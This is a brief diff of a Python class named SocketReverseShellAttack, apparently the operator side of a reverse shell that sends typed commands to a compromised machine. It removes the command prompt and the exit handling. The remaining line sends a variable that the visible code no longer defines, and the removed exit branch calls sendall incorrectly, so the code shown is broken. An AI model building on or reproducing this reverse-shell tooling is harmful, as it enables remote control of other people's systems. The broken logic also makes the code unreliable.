@@ -17,14 +17,6 @@ class SocketReverseShellAttack:
 
         print(message_descriptor)
 
-        command_send = input('Ingresa un comando (escribe "exit" para salir): ')
-
-        if command_send == "exit":
-            connection_reverse_shell = sendall(command_send.encode('utf-8'))
-            connection_reverse_shell.close()
-
-            return False
-
         connection_reverse_shell.sendall(command_send.encode('utf-8'))
     
     def receive_connection(self):
